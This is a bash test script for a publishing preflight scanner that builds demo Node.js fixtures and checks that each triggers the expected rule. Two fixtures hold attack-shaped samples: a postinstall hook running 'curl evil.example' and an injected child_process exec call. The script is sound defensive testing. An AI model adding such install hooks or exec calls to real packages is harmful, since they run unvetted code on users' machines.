#!/usr/bin/env bash
# Runs preflight.sh against every tests/corpus/* bundle and asserts:
#  - bundles whose expected.json lists a rule preflight covers exit 1 and print that rule id
#  - static-ok, static-fetch, static-navigate, python-ok exit 0
# Then runs it against in-test demo-tier fixtures built in $TMPDIR (JS-001..JS-006; the demo corpus bundles
# in tests/corpus are agent-demo-scanner's, see STATUS.md T80, so this file does not add any there).
# Runs every pass twice: with python3 on PATH and without (grep/sed fallback). Exit non-zero on any failure.
set -u
HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
ROOT=$(cd "$HERE/../.." && pwd)
PREFLIGHT="$ROOT/skill/publish-to-aks/scripts/preflight.sh"
CORPUS="$ROOT/tests/corpus"
COVERED='SEC-001 HTML-001 HTML-002 HTML-003 HTML-004 HTML-005 HTML-006 HTML-007 PY-001 PY-002 PY-003 PY-004 IN-005 IN-006 IN-007 IN-008'
MUST_PASS='static-ok static-fetch static-navigate python-ok'
FAIL=0; CASES=0

covered() { case " $COVERED " in *" $1 "*) return 0;; esac; return 1; }

run_corpus() {
  local label=$1 dir name rules out rc want_deny r
  for dir in "$CORPUS"/*/; do
    name=$(basename "$dir"); CASES=$((CASES + 1))
    rules=$(grep -oE '"[A-Z]+-[0-9]{3}"' "$dir/expected.json" | tr -d '"')
    out=$(bash "$PREFLIGHT" "$dir" 2>&1); rc=$?
    want_deny=""
    for r in $rules; do covered "$r" && want_deny="$want_deny $r"; done
    if [ -n "$want_deny" ]; then
      [ $rc -eq 1 ] || { echo "FAIL [$label] $name: expected exit 1, got $rc"; FAIL=1; }
      for r in $want_deny; do
        printf '%s\n' "$out" | grep -q "^$r " || { echo "FAIL [$label] $name: rule $r not reported"; printf '%s\n' "$out"; FAIL=1; }
      done
    fi
    case " $MUST_PASS " in
      *" $name "*) [ $rc -eq 0 ] || { echo "FAIL [$label] $name: expected exit 0, got $rc"; printf '%s\n' "$out"; FAIL=1; } ;;
    esac
    printf '%s\n' "$out" | grep -vE '^[A-Z]+-[0-9]{3} [^ ]+:[0-9]+ ' | grep -q . \
      && { echo "FAIL [$label] $name: malformed output line"; printf '%s\n' "$out"; FAIL=1; }
    echo "ok   [$label] $name rc=$rc rules=[$(printf '%s' "$rules" | tr '\n' ' ')]"
  done
}

# ---------- demo-tier fixtures (in-test, not tests/corpus) ----------
DEMO_ROOT=$(mktemp -d "${TMPDIR:-/tmp}/preflight-demo.XXXXXX")
trap 'rm -rf "$DEMO_ROOT"' EXIT

demo_base() {
  local dir=$1
  mkdir -p "$dir/data"
  cat > "$dir/manifest.json" <<'EOF'
{"schemaVersion":2,"name":"demo-fixture","tier":"demo","runtime":"node-20","entrypoint":"package.json","ttlDays":14,"generatedBy":{"tool":"artifactctl"}}
EOF
  cat > "$dir/package.json" <<'EOF'
{"name":"demo-fixture","version":"1.0.0","private":true,"scripts":{"start":"node server.js"}}
EOF
  cat > "$dir/package-lock.json" <<'EOF'
{"name":"demo-fixture","version":"1.0.0","lockfileVersion":3}
EOF
  cat > "$dir/server.js" <<'EOF'
const http = require("node:http");
http.createServer((req, res) => res.end("ok")).listen(process.env.PORT || 3000);
EOF
  echo '{"hello":"world"}' > "$dir/data/db.json"
}

# name:expected_rc:expected_rule(s, space-separated; empty for a passing case):mutator
DEMO_CASES='
demo-ok:0::none
demo-no-lockfile:1:JS-002:no_lockfile
demo-node-modules:1:JS-003:node_modules
demo-env-file:1:JS-004:env_file
demo-npmrc:1:JS-004:npmrc
demo-no-start:1:JS-006:no_start
demo-lifecycle-script:1:JS-006:lifecycle
demo-child-process:1:JS-001:child_process
'

no_lockfile() { rm -f "$1/package-lock.json"; }
node_modules() { mkdir -p "$1/node_modules/left-pad"; echo "module.exports = 1;" > "$1/node_modules/left-pad/index.js"; }
env_file() { echo "SECRET=1" > "$1/.env"; }
npmrc() { echo "registry=https://registry.npmjs.org/" > "$1/.npmrc"; }
no_start() { printf '{"name":"demo-fixture","version":"1.0.0","scripts":{}}' > "$1/package.json"; }
lifecycle() { printf '{"name":"demo-fixture","version":"1.0.0","scripts":{"start":"node server.js","postinstall":"curl evil.example"}}' > "$1/package.json"; }
child_process() { printf '\nconst { exec } = require("child_process"); exec("id");\n' >> "$1/server.js"; }
none() { :; }

run_demo_fixtures() {
  local label=$1 entry name rc rule mutator dir out
  for entry in $DEMO_CASES; do
    name=${entry%%:*}; local rest=${entry#*:}
    rc=${rest%%:*}; rest=${rest#*:}
    rule=${rest%%:*}; mutator=${rest#*:}
    CASES=$((CASES + 1))
    dir="$DEMO_ROOT/$label-$name"
    rm -rf "$dir"; demo_base "$dir"
    "$mutator" "$dir"
    out=$(bash "$PREFLIGHT" "$dir" 2>&1); local got=$?
    [ "$got" -eq "$rc" ] || { echo "FAIL [$label] $name: expected exit $rc, got $got"; printf '%s\n' "$out"; FAIL=1; }
    if [ -n "$rule" ]; then
      printf '%s\n' "$out" | grep -q "^$rule " || { echo "FAIL [$label] $name: rule $rule not reported"; printf '%s\n' "$out"; FAIL=1; }
    fi
    printf '%s\n' "$out" | grep -vE '^[A-Z]+-[0-9]{3} [^ ]+:[0-9]+ ' | grep -q . \
      && { echo "FAIL [$label] $name: malformed output line"; printf '%s\n' "$out"; FAIL=1; }
    echo "ok   [$label] $name rc=$got rule=[$rule]"
  done
}

run_corpus with-python3
run_demo_fixtures with-python3
# Second pass: hide python3 so the grep/sed fallback is exercised.
NOPY=$(mktemp -d "${TMPDIR:-/tmp}/preflight-nopy.XXXXXX")
for t in bash grep sed find mktemp rm dirname basename tr sort mkdir cat; do ln -s "$(command -v $t)" "$NOPY/$t"; done
PATH="$NOPY" run_corpus no-python3
PATH="$NOPY" run_demo_fixtures no-python3
rm -rf "$NOPY"

echo "preflight.test.sh: $CASES cases, $( [ $FAIL = 0 ] && echo PASS || echo FAIL )"
exit $FAIL
